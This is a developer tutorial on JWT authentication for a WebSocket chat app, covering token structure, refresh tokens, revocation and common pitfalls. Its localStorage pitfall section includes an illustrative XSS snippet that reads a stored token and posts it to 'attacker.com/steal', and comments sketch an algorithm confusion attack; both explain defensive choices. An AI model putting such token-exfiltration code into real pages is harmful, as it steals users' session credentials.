# JWT Authentication Deep Dive

A comprehensive guide to JSON Web Tokens (JWT) and authentication patterns for real-time applications.

---

## What is JWT?

**JSON Web Token (JWT)** is an open standard (RFC 7519) for securely transmitting information between parties as a JSON object. It's **digitally signed**, so it can be **verified** and **trusted**.

### Structure

A JWT consists of three parts separated by dots (`.`):

```
header.payload.signature
```

Example:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### Part 1: Header

Describes the token type and signing algorithm:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

Base64Url encoded → `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`

### Part 2: Payload (Claims)

Contains the data (claims):

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "iat": 1516239022,
  "exp": 1516242622
}
```

Base64Url encoded → `eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ`

**Standard Claims**:

- `iss` (issuer): Who issued the token
- `sub` (subject): User identifier
- `aud` (audience): Who the token is intended for
- `exp` (expiration): Expiration time (Unix timestamp)
- `iat` (issued at): When token was issued
- `nbf` (not before): Token not valid before this time
- `jti` (JWT ID): Unique identifier

**Custom Claims**: Add any data you need (but keep it small!)

### Part 3: Signature

Ensures the token hasn't been tampered with:

```javascript
HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret);
```

Result → `SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`

---

## How JWT Works

### 1. User Login

```
Client                    Server
  │                         │
  │── POST /login ──────────►│
  │   {email, password}      │
  │                          │
  │                          │ Verify credentials
  │                          │ Generate JWT
  │                          │
  │◄─ 200 OK ────────────────│
  │   {token: "eyJ..."}      │
  │                          │
```

**Server code**:

```javascript
const jwt = require("jsonwebtoken");

async function login(req, res) {
  const { email, password } = req.body;

  // 1. Find user
  const user = await User.findByEmail(email);
  if (!user) {
    throw new UnauthorizedError("Invalid credentials");
  }

  // 2. Verify password
  const isValid = await bcrypt.compare(password, user.password_hash);
  if (!isValid) {
    throw new UnauthorizedError("Invalid credentials");
  }

  // 3. Generate JWT
  const token = jwt.sign(
    { userId: user.id, email: user.email },
    process.env.JWT_SECRET,
    { expiresIn: "15m" }
  );

  // 4. Return token
  res.json({ token, user: { id: user.id, email: user.email } });
}
```

### 2. Authenticated Requests

```
Client                    Server
  │                         │
  │── GET /api/rooms ───────►│
  │   Authorization:         │
  │   Bearer eyJ...          │
  │                          │
  │                          │ Verify JWT
  │                          │ Extract userId
  │                          │ Fetch data
  │                          │
  │◄─ 200 OK ────────────────│
  │   {rooms: [...]}         │
  │                          │
```

**Middleware**:

```javascript
function requireAuth(req, res, next) {
  // 1. Extract token from header
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    throw new UnauthorizedError("No token provided");
  }

  const token = authHeader.split(" ")[1];

  try {
    // 2. Verify and decode token
    const decoded = jwt.verify(token, process.env.JWT_SECRET);

    // 3. Attach user info to request
    req.userId = decoded.userId;
    req.userEmail = decoded.email;

    next();
  } catch (error) {
    if (error.name === "TokenExpiredError") {
      throw new UnauthorizedError("Token expired");
    }
    throw new UnauthorizedError("Invalid token");
  }
}

// Use in routes
app.get("/api/rooms", requireAuth, getRooms);
```

---

## Access Token vs Refresh Token

### The Problem

If access tokens are long-lived (e.g., 7 days):

- ❌ If stolen, attacker has access for 7 days
- ❌ Can't revoke easily (JWT is stateless)

If access tokens are short-lived (e.g., 15 minutes):

- ❌ User must log in every 15 minutes (bad UX)

### The Solution: Refresh Tokens

**Strategy**:

1. **Access Token**: Short-lived (15 min), used for API requests
2. **Refresh Token**: Long-lived (7 days), used to get new access tokens

**Flow**:

```
Client                    Server
  │                         │
  │── POST /login ──────────►│
  │                          │
  │◄─ 200 OK ────────────────│
  │   {accessToken: "...",   │
  │    refreshToken: "..."}  │
  │                          │
  │                          │
  │  (15 minutes later...)   │
  │                          │
  │── GET /api/rooms ───────►│
  │   Authorization:         │
  │   Bearer <accessToken>   │
  │                          │
  │◄─ 401 Unauthorized ──────│
  │   (Token expired)        │
  │                          │
  │── POST /auth/refresh ───►│
  │   {refreshToken: "..."}  │
  │                          │
  │◄─ 200 OK ────────────────│
  │   {accessToken: "..."}   │
  │                          │
```

**Implementation**:

```javascript
// Login - return both tokens
async function login(req, res) {
  // ... verify credentials ...

  const accessToken = jwt.sign({ userId: user.id }, process.env.JWT_SECRET, {
    expiresIn: "15m",
  });

  const refreshToken = jwt.sign(
    { userId: user.id },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: "7d" }
  );

  // Store refresh token in database (for revocation)
  await RefreshToken.create({
    userId: user.id,
    token: refreshToken,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
  });

  res.json({ accessToken, refreshToken });
}

// Refresh endpoint
async function refresh(req, res) {
  const { refreshToken } = req.body;

  if (!refreshToken) {
    throw new UnauthorizedError("No refresh token");
  }

  try {
    // Verify refresh token
    const decoded = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET);

    // Check if token exists in database (not revoked)
    const storedToken = await RefreshToken.findOne({
      userId: decoded.userId,
      token: refreshToken,
    });

    if (!storedToken) {
      throw new UnauthorizedError("Invalid refresh token");
    }

    // Generate new access token
    const accessToken = jwt.sign(
      { userId: decoded.userId },
      process.env.JWT_SECRET,
      { expiresIn: "15m" }
    );

    res.json({ accessToken });
  } catch (error) {
    throw new UnauthorizedError("Invalid refresh token");
  }
}

// Logout - revoke refresh token
async function logout(req, res) {
  const { refreshToken } = req.body;

  // Delete from database
  await RefreshToken.deleteOne({ token: refreshToken });

  res.json({ message: "Logged out successfully" });
}
```

---

## JWT for WebSocket Authentication

WebSocket doesn't have HTTP headers after handshake. Options:

### Option 1: Token in First Message (Recommended)

**Client**:

```javascript
const ws = new WebSocket("ws://localhost:3001");

ws.addEventListener("open", () => {
  ws.send(
    JSON.stringify({
      type: "authenticate",
      token: accessToken,
    })
  );
});

ws.addEventListener("message", (event) => {
  const data = JSON.parse(event.data);

  if (data.type === "authenticated") {
    console.log("Authenticated as:", data.username);
  } else if (data.type === "auth_error") {
    console.error("Auth failed:", data.message);
    ws.close();
  }
});
```

**Server**:

```javascript
wss.on("connection", (ws) => {
  let isAuthenticated = false;
  let userId = null;

  // Set timeout for authentication
  const authTimeout = setTimeout(() => {
    if (!isAuthenticated) {
      ws.send(
        JSON.stringify({
          type: "auth_error",
          message: "Authentication timeout",
        })
      );
      ws.close(1008, "Authentication timeout");
    }
  }, 5000); // 5 second timeout

  ws.on("message", (data) => {
    const message = JSON.parse(data);

    // First message must be authentication
    if (!isAuthenticated && message.type === "authenticate") {
      try {
        const decoded = jwt.verify(message.token, process.env.JWT_SECRET);
        userId = decoded.userId;
        isAuthenticated = true;

        clearTimeout(authTimeout);

        ws.send(
          JSON.stringify({
            type: "authenticated",
            userId: userId,
          })
        );
      } catch (error) {
        ws.send(
          JSON.stringify({ type: "auth_error", message: "Invalid token" })
        );
        ws.close(1008, "Invalid token");
      }
      return;
    }

    // All other messages require authentication
    if (!isAuthenticated) {
      ws.send(JSON.stringify({ type: "error", message: "Not authenticated" }));
      return;
    }

    // Handle authenticated messages...
  });

  ws.on("close", () => {
    clearTimeout(authTimeout);
  });
});
```

### Option 2: Token in Query Parameter

**Less secure** (token in URL can be logged):

```javascript
// Client
const ws = new WebSocket(`ws://localhost:3001?token=${accessToken}`);

// Server
wss.on("connection", (ws, req) => {
  const url = new URL(req.url, "http://localhost");
  const token = url.searchParams.get("token");

  if (!token) {
    ws.close(1008, "No token provided");
    return;
  }

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    ws.userId = decoded.userId;
  } catch (error) {
    ws.close(1008, "Invalid token");
  }
});
```

---

## Security Best Practices

### 1. Use Strong Secrets

```javascript
// BAD
const JWT_SECRET = "secret123";

// GOOD (at least 256 bits / 32 bytes)
const JWT_SECRET = crypto.randomBytes(32).toString("hex");
// Store in environment variable!
```

Generate secret:

```bash
node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

### 2. Keep Payload Small

JWT is sent with every request. Keep it minimal:

```javascript
// BAD - 500+ bytes
const token = jwt.sign(
  {
    userId: user.id,
    email: user.email,
    name: user.name,
    bio: user.bio,
    avatar: user.avatar,
    preferences: user.preferences,
    // ...
  },
  secret
);

// GOOD - ~100 bytes
const token = jwt.sign(
  {
    userId: user.id,
  },
  secret
);
// Fetch other data from database when needed
```

### 3. Set Expiration

**Always** set `exp` claim:

```javascript
// BAD - never expires
const token = jwt.sign({ userId: user.id }, secret);

// GOOD
const token = jwt.sign({ userId: user.id }, secret, { expiresIn: "15m" });
```

### 4. Use HTTPS

JWT is **not encrypted**, only signed. Anyone can decode it:

```javascript
// Decode JWT (no verification)
const parts = token.split(".");
const payload = JSON.parse(Buffer.from(parts[1], "base64").toString());
console.log(payload); // Visible to anyone!
```

**Therefore**:

- ✅ Use HTTPS in production (encrypts transmission)
- ❌ Don't put sensitive data in payload (passwords, credit cards)

### 5. Validate Claims

```javascript
function verifyToken(token) {
  try {
    const decoded = jwt.verify(token, secret, {
      algorithms: ["HS256"], // Prevent algorithm confusion attack
      issuer: "myapp", // Verify issuer
      audience: "myapp-api", // Verify audience
    });

    // Additional validation
    if (!decoded.userId) {
      throw new Error("Missing userId claim");
    }

    return decoded;
  } catch (error) {
    throw new UnauthorizedError("Invalid token");
  }
}
```

### 6. Token Revocation

JWT is **stateless**, so you can't "revoke" it. Solutions:

**Option A: Token Blacklist (Redis)**

```javascript
// On logout
await redis.setex(`blacklist:${token}`, 900, "1"); // 15 min TTL

// On verify
async function verifyToken(token) {
  const isBlacklisted = await redis.exists(`blacklist:${token}`);
  if (isBlacklisted) {
    throw new UnauthorizedError("Token revoked");
  }

  // Verify JWT...
}
```

**Option B: Refresh Token Revocation**

```javascript
// Store refresh tokens in database
// On logout, delete refresh token
await RefreshToken.deleteOne({ token: refreshToken });

// Access token still valid until expiration (15 min max)
```

**Option C: Short Expiration + Refresh Tokens** (Recommended)

- Access token expires quickly (15 min)
- If compromised, limited window of exposure
- Refresh token can be revoked in database

---

## Alternative: Session-Based Auth

### JWT vs Sessions

| Aspect          | JWT                              | Sessions                        |
| --------------- | -------------------------------- | ------------------------------- |
| **Storage**     | Client (in token)                | Server (in memory/DB/Redis)     |
| **Scalability** | Stateless, easy to scale         | Requires shared session store   |
| **Revocation**  | Difficult                        | Easy (delete session)           |
| **Size**        | Larger (sent with every request) | Smaller (just session ID)       |
| **Expiration**  | Built-in                         | Manual implementation           |
| **Use Case**    | Microservices, APIs              | Monoliths, server-rendered apps |

### When to Use Sessions

For WebSocket chat app, JWT is better because:

- ✅ Stateless (scales horizontally)
- ✅ No session store lookup on every message
- ✅ Works seamlessly across multiple servers

But sessions are fine too:

```javascript
// Express session
const session = require('express-session');
const RedisStore = require('connect-redis').default;

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: true, // HTTPS only
    httpOnly: true,
    maxAge: 1000 * 60 * 60 * 24 * 7, // 7 days
  },
}));

// WebSocket with session
wss.on('connection', (ws, req) => {
  // Parse session cookie
  const sessionId = parseCookie(req.headers.cookie).sid;

  // Fetch session from Redis
  const session = await getSession(sessionId);

  if (!session || !session.userId) {
    ws.close(1008, 'Not authenticated');
    return;
  }

  ws.userId = session.userId;
});
```

---

## Common Pitfalls

### 1. Algorithm Confusion Attack

```javascript
// VULNERABLE
const decoded = jwt.verify(token, secret);

// Server uses HS256 (symmetric)
// Attacker changes header to RS256 (asymmetric)
// Uses public key as secret
// Server verifies with public key → success!

// SECURE
const decoded = jwt.verify(token, secret, {
  algorithms: ["HS256"], // Explicitly set allowed algorithms
});
```

### 2. Storing JWT in localStorage

```javascript
// VULNERABLE to XSS
localStorage.setItem("token", token);

// If attacker injects script:
const stolenToken = localStorage.getItem("token");
fetch("https://attacker.com/steal", {
  method: "POST",
  body: stolenToken,
});
```

**Better**: Use httpOnly cookies (for web):

```javascript
// Server sets cookie
res.cookie("token", token, {
  httpOnly: true, // Not accessible via JavaScript
  secure: true, // HTTPS only
  sameSite: "strict",
});
```

**Best for SPA**: Store in memory (re-auth on page reload) or use refresh token flow.

### 3. Not Handling Token Expiration

```javascript
// BAD - user sees cryptic error
fetch("/api/rooms", {
  headers: { Authorization: `Bearer ${token}` },
});
// → 401 Unauthorized

// GOOD - auto-refresh
async function authenticatedFetch(url, options = {}) {
  let token = getAccessToken();

  let response = await fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      Authorization: `Bearer ${token}`,
    },
  });

  if (response.status === 401) {
    // Token expired, try to refresh
    token = await refreshAccessToken();

    // Retry original request
    response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        Authorization: `Bearer ${token}`,
      },
    });
  }

  return response;
}
```

---

## Implementation Checklist

Authentication setup checklist:

- [ ] Generate strong JWT secret (32+ bytes)
- [ ] Store secret in environment variable
- [ ] Set short expiration for access tokens (15 min)
- [ ] Implement refresh token mechanism
- [ ] Store refresh tokens in database
- [ ] Validate all JWT claims (exp, iss, aud)
- [ ] Use HTTPS in production
- [ ] Implement logout (revoke refresh token)
- [ ] Handle token expiration gracefully
- [ ] Hash passwords with bcrypt (10+ rounds)
- [ ] Rate limit login attempts
- [ ] Add WebSocket authentication timeout
- [ ] Validate token on every WebSocket message
- [ ] Don't store sensitive data in JWT payload

---

## Further Reading

- [RFC 7519: JWT](https://datatracker.ietf.org/doc/html/rfc7519)
- [JWT.io](https://jwt.io/)
- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [Auth0 JWT Handbook](https://auth0.com/resources/ebooks/jwt-handbook)

---

**Key Takeaways**:

1. JWT is signed, not encrypted (use HTTPS)
2. Keep payload small and avoid sensitive data
3. Use short-lived access tokens + long-lived refresh tokens
4. Store refresh tokens in database for revocation
5. Validate all claims when verifying tokens
6. For WebSockets, send token in first message
7. Always set expiration and use strong secrets

With proper JWT implementation, your chat app will have secure, scalable authentication! 🔐
